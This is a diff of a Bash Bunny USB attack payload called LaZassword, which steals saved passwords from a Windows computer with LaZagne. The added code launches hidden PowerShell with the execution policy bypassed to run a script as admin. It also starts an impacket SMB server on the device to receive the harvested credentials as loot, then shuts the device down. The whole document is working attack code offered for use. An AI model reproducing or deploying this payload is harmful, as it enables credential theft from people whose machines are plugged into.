@@ -2,33 +2,74 @@
 #
 # Title: LaZassword
 # Author: kuyaya
-# Version: 1.1
+# Version: 1.2
+# Description: Recover passwords using LaZagne
+
+###############################################
+#		MANDATORY SETUP		      #
+###############################################
 
 # Check readiness & prepare environment
 LED SETUP
-ATTACKMODE HID STORAGE
+ATTACKMODE HID STORAGE RNDIS_ETHERNET
 
 # Ensure loot is available for saving results.
 mount -o sync /dev/nandf /root/udisk/
 
-# Setup
-DUCKY_LANG=ch
+# Define the TARGET_HOSTNAME variable
+while [ -z $TARGET_HOSTNAME ]; do
+	GET TARGET_HOSTNAME;
+	sleep 1;
+done
+
+
+#############################################
+#		CONFIGURATION		    #
+#############################################
+
+# Define keyboard layout here ('us' is default):
+keyboard_lang="ch"
+
+# Define name of the loot folder here (has to match with the one in LaZassword.ps1, hostname is default):
+lootfolder=$TARGET_HOSTNAME
+
+
+#####################################
+#		SETUP		    #
+#####################################
+
+# Set the keyboard layout
+DUCKY_LANG=$keyboard_lang
+
+# Define the SWITCH_POSITION variable
 GET SWITCH_POSITION
-GET TARGET_HOSTNAME 
+
+# Create the LaZassword directory
+mkdir -p /root/udisk/loot/LaZassword
 
 # Attack
 LED ATTACK
 
-# Run lazassword.ps1 as admin
-RUN WIN "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bypass.ps1')"
 
-# Wait until passwords are grabbed
-while [ ! -f /root/udisk/loot/LaZassword/done ]
+#######################################
+#		PAYLOAD		      #
+#######################################
+
+# Run LaZassword.ps1 as admin
+RUN WIN "PowerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bypass.ps1')"
+
+# Start the impacket server to receive a signal
+python /tools/impacket/examples/smbserver.py -smb2support LaZassword /root/udisk/loot/LaZassword/$lootfolder >> /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt &
+
+# Wait for the signal
+while ! grep -wq "Handle" /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt
 do
 LED ATTACK
+sleep 1
 done
 
 # Finish
-# The remove of the file is necessary. Else, the loop wouldn't work.
-rm /root/udisk/loot/LaZassword/done
 LED FINISH
+
+# Turn the BashBunny off
+shutdown 0
